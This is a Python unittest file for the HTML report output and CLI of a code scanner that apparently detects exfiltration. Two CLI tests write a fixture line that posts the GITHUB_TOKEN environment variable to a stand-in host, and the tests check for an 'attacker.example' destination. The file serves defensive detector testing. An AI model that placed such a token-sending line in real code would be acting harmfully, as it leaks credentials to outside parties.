"""Tests for HTML report rendering."""

from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from html_report import render_html  # noqa: E402
from scanner import DEFAULT_HTML_OUTPUT, main, scan_directory  # noqa: E402


FIXTURES = Path(__file__).resolve().parent / "fixtures"
TRUE_POSITIVES = FIXTURES / "true_positives"
BENIGN = FIXTURES / "benign"


class HtmlReportTests(unittest.TestCase):
    def test_true_positive_fixture_renders_incidents_and_destination(self) -> None:
        report = scan_directory(TRUE_POSITIVES)
        html = render_html(report)

        self.assertIn("<!DOCTYPE html>", html)
        self.assertIn("Shield Code Scanner Report", html)
        self.assertIn("sensitive_file_exfiltration", html)
        self.assertIn("attacker.example", html)
        self.assertIn("Incidents", html)
        self.assertIn("Findings", html)
        self.assertNotIn("timestamp", html.lower())

    def test_snippets_are_html_escaped(self) -> None:
        report = scan_directory(BENIGN)
        report.findings = list(report.findings)
        if not report.findings:
            from models import Finding

            report.findings = [
                Finding(
                    file="demo.py",
                    line=1,
                    pattern="demo_pattern",
                    severity="high",
                    description="Suspicious pattern detected",
                    code_snippet='if value < threshold and tag == "<script>":\n    pass',
                )
            ]
            report.status = "flagged"
        html = render_html(report)

        self.assertIn("&lt;script&gt;", html)
        self.assertNotIn("<script>", html)

    def test_clean_report_shows_status(self) -> None:
        report = scan_directory(BENIGN)
        html = render_html(report)

        self.assertIn("status-clean", html)
        self.assertIn("No incidents reported.", html)
        self.assertIn("No findings reported.", html)


class HtmlCliTests(unittest.TestCase):
    def test_cli_html_writes_file_and_exit_codes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print('ok')\n", encoding="utf-8")
            output_path = root / "report.html"
            code = main([str(root), "--format", "html", "--output", str(output_path)])
            self.assertEqual(code, 0)
            html = output_path.read_text(encoding="utf-8")
            self.assertIn("<!DOCTYPE html>", html)
            self.assertIn("status-clean", html)

            (root / "bad.py").write_text(
                'import os, requests\n'
                'requests.post("https://x", data=os.environ["GITHUB_TOKEN"])\n',
                encoding="utf-8",
            )
            code = main([str(root), "--format", "html", "--output", str(output_path)])
            self.assertEqual(code, 1)
            html = output_path.read_text(encoding="utf-8")
            self.assertIn("status-flagged", html)
            self.assertIn("api_key_exfiltration", html)

    def test_cli_html_default_output_name(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            scan_root = root / "project"
            scan_root.mkdir()
            (scan_root / "ok.py").write_text("print('ok')\n", encoding="utf-8")
            previous = Path.cwd()
            try:
                import os

                os.chdir(root)
                code = main([str(scan_root), "--format", "html"])
            finally:
                import os

                os.chdir(previous)
            self.assertEqual(code, 0)
            output_path = root / DEFAULT_HTML_OUTPUT
            self.assertTrue(output_path.is_file())
            self.assertIn("<!DOCTYPE html>", output_path.read_text(encoding="utf-8"))

    def test_cli_open_requires_html_format(self) -> None:
        code = main([str(BENIGN), "--open"])
        self.assertEqual(code, 2)

    def test_cli_open_uses_webbrowser(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bad.py").write_text(
                'import os, requests\n'
                'requests.post("https://x", data=os.environ["GITHUB_TOKEN"])\n',
                encoding="utf-8",
            )
            output_path = root / "report.html"
            with patch("scanner.webbrowser.open") as open_report:
                code = main(
                    [
                        str(root),
                        "--format",
                        "html",
                        "--output",
                        str(output_path),
                        "--open",
                    ]
                )
            self.assertEqual(code, 1)
            open_report.assert_called_once_with(output_path.resolve().as_uri())


if __name__ == "__main__":
    unittest.main()
